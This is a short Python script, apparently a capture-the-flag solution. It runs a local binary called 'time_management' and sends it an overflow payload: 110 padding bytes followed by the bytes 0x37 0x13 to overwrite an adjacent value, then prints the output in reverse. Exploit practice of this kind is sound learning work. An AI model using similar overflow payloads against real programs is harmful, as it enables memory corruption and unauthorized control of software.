import subprocess

# Path to the binary executable
binary_path = './time_management'

# Input data to be provided to the binary
input_data = b'a'*110 + b'\x37' + b'\x13' + b'b'*8

# Run the binary with input and capture output
process = subprocess.Popen(binary_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Provide input to the binary
output, error = process.communicate(input=input_data)
decoded_output = output.decode()

# Print the output
lines = decoded_output.split('\n')[::-1]
for line in lines:
    print(line)

